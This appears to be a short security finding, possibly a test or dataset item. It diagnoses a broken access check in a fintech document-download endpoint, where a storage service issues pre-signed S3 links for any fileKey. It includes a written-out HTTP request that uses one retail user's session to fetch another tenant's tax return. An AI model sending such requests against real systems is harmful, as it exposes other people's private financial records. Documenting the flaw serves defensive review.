diagnosis: The document download link handler forwards the unverified fileKey query parameter directly to a shared monorepo RPC storage client. The storage service implicitly trusts requests from the API gateway signed with the internal M2M key and generates pre-signed S3 download URLs without verifying if the authenticated user owns or has access to the target fileKey.
exploit_request:
GET /api/documents/download-link?fileKey=tenants/tenant_alpha_investments/tax_returns_2025.pdf HTTP/1.1
Host: gateway.fintechplatform.io:8082
Cookie: session_id=retail_user_session_441
